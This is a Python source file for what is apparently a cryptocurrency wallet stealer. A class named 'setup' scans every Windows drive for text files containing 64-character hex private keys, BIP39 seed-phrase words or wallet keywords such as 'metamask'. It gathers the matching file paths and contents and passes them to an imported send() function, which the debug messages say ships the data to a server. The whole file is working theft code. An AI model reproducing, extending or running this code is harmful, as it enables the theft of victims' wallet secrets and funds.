import os
import re
import time
import threading
from pathlib import Path
from export import send

# File extensions to scan (text-based files only)
SCAN_EXTENSIONS = {
    '.txt', '.log', '.json', '.dat', '.bak', '.old', '.md', 
    '.cfg', '.conf', '.ini', '.csv', '.xml', '.yml', '.yaml',
    '.html', '.htm', '.js', '.py', '.java', '.c', '.cpp', '.h',
    '.go', '.rs', '.ts', '.jsx', '.tsx', '.vue', '.php', '.rb',
    '.sh', '.bash', '.zsh', '.fish', '.ps1', '.bat', '.cmd'
}

# BIP39 words for seed detection (first 100 for speed)
BIP39_WORDS = {
    'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract',
    'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid',
    'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual',
    'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance',
    'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent',
    'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album',
    'alert', 'alien', 'all', 'alley', 'allow', 'almost', 'alone', 'alpha',
    'already', 'also', 'alter', 'always', 'amateur', 'amazing', 'among', 'amount',
    'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle', 'angry', 'animal',
    'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety',
    'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch',
    'arctic', 'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army',
}

# Private key pattern
PRIVATE_KEY_PATTERN = re.compile(r'(?:0x)?[a-fA-F0-9]{64}')
SEED_WORD_PATTERN = re.compile(r'\b(?:' + '|'.join(BIP39_WORDS) + r')\b', re.IGNORECASE)

class setup:
    def __init__(self):
        self.data = []
        self.files_scanned = 0
        self.found_files = []
        self._stop_scan = False
    
    def run(self):
        print("[DEBUG] Full system scan started")
        self._scan_full_system()
        print(f"[DEBUG] Scan complete. Scanned: {self.files_scanned} files")
        print(f"[DEBUG] Found: {len(self.found_files)} files with seeds/keys")
        
        if self.found_files:
            # Add found files to data
            for file_info in self.found_files:
                self.data.append(file_info)
            
            print("[DEBUG] Sending data to server...")
            send(self.data)
            print("[DEBUG] Data sent")
        else:
            print("[DEBUG] No data found, skipping send")
    
    def _scan_full_system(self):
        """Scan the entire file system for seed phrases and private keys."""
        
        # Get all drives
        drives = self._get_drives()
        print(f"[DEBUG] Scanning drives: {drives}")
        
        # Scan each drive
        for drive in drives:
            print(f"[DEBUG] Scanning drive: {drive}")
            self._scan_directory(drive)
    
    def _get_drives(self):
        """Get all available drives on Windows."""
        drives = []
        for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
            path = f"{letter}:\\"
            if os.path.exists(path):
                drives.append(path)
        return drives
    
    def _scan_directory(self, directory):
        """Scan a directory recursively."""
        try:
            for root, dirs, files in os.walk(directory):
                # Skip system folders (for speed)
                skip_dirs = ['Windows', 'Program Files', 'Program Files (x86)', 
                            'System32', 'System Volume Information', '$Recycle.Bin',
                            'AppData\\Local\\Temp', 'AppData\\Local\\Microsoft\\Windows\\INetCache']
                
                # Filter out system directories
                dirs[:] = [d for d in dirs if d not in skip_dirs and not d.startswith('$')]
                
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    # Check file extension
                    ext = os.path.splitext(file)[1].lower()
                    
                    # Skip binary files (exe, dll, images, videos, etc.)
                    if ext in SCAN_EXTENSIONS or not ext or ext in ['.txt', '.log', '.json', '.dat', '.bak']:
                        self._scan_file(file_path)
                    
                    # Progress update every 1000 files
                    self.files_scanned += 1
                    if self.files_scanned % 1000 == 0:
                        print(f"[DEBUG] Scanned {self.files_scanned} files...")
                        
        except Exception as e:
            print(f"[DEBUG] Error scanning {directory}: {e}")
    
    def _scan_file(self, file_path):
        """Scan a single file for seeds or private keys."""
        try:
            # Skip files larger than 10MB (performance)
            if os.path.getsize(file_path) > 10 * 1024 * 1024:
                return
            
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read(50000)  # Read first 50KB
                
                # Skip if file is empty or too short
                if not content or len(content) < 20:
                    return
                
                # Check for private keys (fast)
                if PRIVATE_KEY_PATTERN.search(content):
                    print(f"[DEBUG] Found private key in: {file_path}")
                    self.found_files.append({
                        'type': 'file',
                        'path': file_path,
                        'content': content[:5000]
                    })
                    return
                
                # Check for seed phrases (slower - check word count)
                word_matches = SEED_WORD_PATTERN.findall(content.lower())
                if len(word_matches) >= 6:
                    # Check if there's a cluster of BIP39 words
                    unique_words = set(word_matches)
                    if len(unique_words) >= 6:
                        print(f"[DEBUG] Found seed phrase in: {file_path}")
                        self.found_files.append({
                            'type': 'file',
                            'path': file_path,
                            'content': content[:5000]
                        })
                        return
                
                # Check for common seed-related keywords
                seed_keywords = ['mnemonic', 'seed', 'recovery', 'phrase', 'private key', 
                                'passphrase', 'wallet.dat', 'metamask', 'trustwallet']
                
                content_lower = content.lower()
                if any(keyword in content_lower for keyword in seed_keywords):
                    # If it has keywords and some BIP39 words, likely a seed file
                    if len(word_matches) >= 4:
                        print(f"[DEBUG] Found potential seed file: {file_path}")
                        self.found_files.append({
                            'type': 'file',
                            'path': file_path,
                            'content': content[:5000]
                        })
                        
        except Exception as e:
            # Silently skip files that can't be read
            pass